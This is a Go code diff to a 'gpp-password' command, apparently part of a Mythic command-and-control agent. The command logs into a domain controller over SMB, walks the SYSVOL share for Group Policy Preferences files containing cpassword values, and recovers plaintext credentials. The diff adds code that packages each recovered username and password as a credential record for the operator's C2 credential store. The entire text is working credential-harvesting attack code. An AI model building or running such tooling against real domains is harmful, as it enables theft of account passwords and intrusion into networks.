@@ -99,7 +99,7 @@ func (c *GppPasswordCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	output, err := searchGPPPasswords(args)
+	output, creds, err := searchGPPPasswords(args)
 	if err != nil {
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Error: %v", err),
@@ -108,11 +108,15 @@ func (c *GppPasswordCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    output,
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		result.Credentials = &creds
+	}
+	return result
 }
 
 // GPP XML structures for parsing cpassword attributes
@@ -153,11 +157,11 @@ type gppDrives struct {
 	Drives  []gppItem `xml:"Drive"`
 }
 
-func searchGPPPasswords(args gppArgs) (string, error) {
+func searchGPPPasswords(args gppArgs) (string, []structs.MythicCredential, error) {
 	// Connect to DC via SMB
 	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", args.Server, args.Port), 10*time.Second)
 	if err != nil {
-		return "", fmt.Errorf("TCP connect to %s:%d: %v", args.Server, args.Port, err)
+		return "", nil, fmt.Errorf("TCP connect to %s:%d: %v", args.Server, args.Port, err)
 	}
 
 	initiator := &smb2.NTLMInitiator{
@@ -170,14 +174,14 @@ func searchGPPPasswords(args gppArgs) (string, error) {
 	session, err := d.Dial(conn)
 	if err != nil {
 		_ = conn.Close()
-		return "", fmt.Errorf("SMB auth failed: %v", err)
+		return "", nil, fmt.Errorf("SMB auth failed: %v", err)
 	}
 	defer func() { _ = session.Logoff() }()
 
 	// Mount SYSVOL share
 	share, err := session.Mount(fmt.Sprintf(`\\%s\SYSVOL`, args.Server))
 	if err != nil {
-		return "", fmt.Errorf("mount SYSVOL: %v", err)
+		return "", nil, fmt.Errorf("mount SYSVOL: %v", err)
 	}
 	defer func() { _ = share.Umount() }()
 
@@ -189,7 +193,7 @@ func searchGPPPasswords(args gppArgs) (string, error) {
 	// Walk the entire SYSVOL looking for XML files
 	err = gppWalkDir(share, ".", &results, &filesSearched)
 	if err != nil {
-		return "", fmt.Errorf("walking SYSVOL: %v", err)
+		return "", nil, fmt.Errorf("walking SYSVOL: %v", err)
 	}
 
 	var sb strings.Builder
@@ -201,11 +205,12 @@ func searchGPPPasswords(args gppArgs) (string, error) {
 		sb.WriteString("\nNo GPP passwords found.\n")
 		sb.WriteString("\nNote: MS14-025 patched this issue in 2014. Modern environments\n")
 		sb.WriteString("should not have cpassword attributes in GPP XML files.\n")
-		return sb.String(), nil
+		return sb.String(), nil, nil
 	}
 
 	sb.WriteString(fmt.Sprintf("\nFound %d GPP credential(s):\n\n", len(results)))
 
+	var creds []structs.MythicCredential
 	for i, r := range results {
 		sb.WriteString(fmt.Sprintf("--- Credential %d ---\n", i+1))
 		sb.WriteString(fmt.Sprintf("  File:     %s\n", r.File))
@@ -221,9 +226,19 @@ func searchGPPPasswords(args gppArgs) (string, error) {
 			sb.WriteString(fmt.Sprintf("  Action:   %s\n", r.Action))
 		}
 		sb.WriteString("\n")
+
+		if r.Password != "" && r.Username != "" {
+			creds = append(creds, structs.MythicCredential{
+				CredentialType: "plaintext",
+				Realm:          args.Domain,
+				Account:        r.Username,
+				Credential:     r.Password,
+				Comment:        fmt.Sprintf("gpp-password (%s)", r.File),
+			})
+		}
 	}
 
-	return sb.String(), nil
+	return sb.String(), creds, nil
 }
 
 func gppWalkDir(share *smb2.Share, path string, results *[]gppResult, filesSearched *int) error {
